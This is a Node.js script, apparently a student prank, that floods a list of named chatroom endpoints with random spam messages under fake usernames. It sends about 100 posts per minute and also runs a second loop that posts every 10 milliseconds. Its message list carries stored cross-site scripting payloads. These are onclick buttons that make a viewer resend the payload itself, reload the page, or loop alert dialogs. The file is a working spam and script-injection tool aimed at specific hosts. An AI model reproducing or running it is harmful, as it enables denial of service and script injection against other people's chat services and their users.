var request = require("request");
console.log("Running")
var possibleMessages = [
    "Hi krish",
    "what are you doing",
    "hello",
    "hi",
    "are you there",
    "Who wants pi!",
    "why are you blocking me",
    "am i a bot",
    "are you a bot",
    "are we all bots",
    "i have a crisis",
    "help me KrishS",
    "I am the best",
    "THiS iS KrisHs aNd YOu hAVe HAckEd youR seLF",
    "Congrats on getting hacked",
    "ha ha",
    "hacked",
    "loooooser",
    "luser",
    "Winner?",
    ">:() >:( <:]",
    "I win! and you lose!",
    "me best",
    "who knows",
    "ok",
    ":) :) :) :) :) :) :)",
    ":( :( :( :( :( :( :(",
    "My friend sebastian in a lunatic",
    "Melanie is coming",
    "Mrs yates is building a hedge wall",
    "End transmission",
    "m3 c4n sp311",
    "HI TheRE!",
    "SPAM",
    "asoiasgoasmfoiasjgoiasdmfoajgaosf oiadgjosDFMOASG",
    "the microwave is in the oven",
    "<button onclick=\"document.getElementById('message').value = document.getElementById('ha').outerHTML; document.getElementById('name').value = 'Click the Button'; document.getElementById('send').click()\" id=\"ha\"><h1>CLICK ME</h1></button>",
    "What's up",
    "What's new",
    "Whate have you been up to lately",
    "How are things",
    "How's life",
    "I'm fine",
    "How are you",
    "Do you have any Idea what 1 + 1 is?",
    "I didn't mean to",
    "Exactly",
    "Absolutely",
    "I don't agree",
    "Awesome",
    "Oh no... Oh no... Oh no...",
    "name",
    "Hands Up",
    "<button onclick=\"window.location.reload()\">CLICK ME</button>",
    "THIS BROKEN",
    "XSS attack",
    "Any ideas for new messages?",
    "My dog ate food",
    "<button onclick=\"for(var i = 0; i < 10; i++) {alert('CLICK ME button hack')}\">CLICK ME</button>",
    "&lt;h1&gt;Br0k3n C0d3&lt;h1&gt;",
    "#BANary movement is real",
    "Lo siento pero... Tienes mi pasaporte?",
    "Donde esta mi Boleto?"
];

var possibleNames = [
    "Noob",
    "KrishS",
    "hi",
    "hacker",
    "hola",
    "hi there",
    "what",
    "sp3ll",
    "bot",
    "ih",
    "olleH",
    "YAY",
    "Click The Button",
    "Button The Click",
    "Trevor",
    "Nicholas",
    "Mr. Dave",
    "Andy",
    "Killroy",
    "no",
    "yes",
    "Message",
    "Input",
    "Ayden",
    "Security",
    "DOGGO",
    "Jack",
    "Mr. Giant",
    "Code Master",
    "Hacker",
    "Whiner"
    ];
var whoToHackArray = ["http://aaronchatroom.mrcode.io/message", "http://chatroom-krish-edition.mrcode.io/message", "https://xss.mrcodeswildride.com/send", "http://chatroom.mrcode.io/message", "http://rylanschatroom.mrcode.io/message"];


// controls
var messagesPerMinute = 100; // num
var whoToHack = whoToHackArray[4];

setInterval(function() {
    var msg = possibleMessages[Math.floor(Math.random() * possibleMessages.length)];
    var nme = possibleNames[Math.floor(Math.random() * possibleNames.length)];
    request.post(whoToHack, { form: { message: msg, name: nme } });
    // request.open("POST", "http://chatroom-krish-edition.mrcode.io/message");
    // request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    // request.send("message=" + "THiS iS KrisHs aNd YOu hAVe HAckEd youR seLF");
    console.log(nme + ": " + msg);
}, (60 / messagesPerMinute) * 1000);


setInterval(function() {
    var msg = "HA HA HA HA HA HA";
    var nme = "Hacker Man";
    request.post(whoToHack, { form: { message: msg, name: nme } });
}, 10);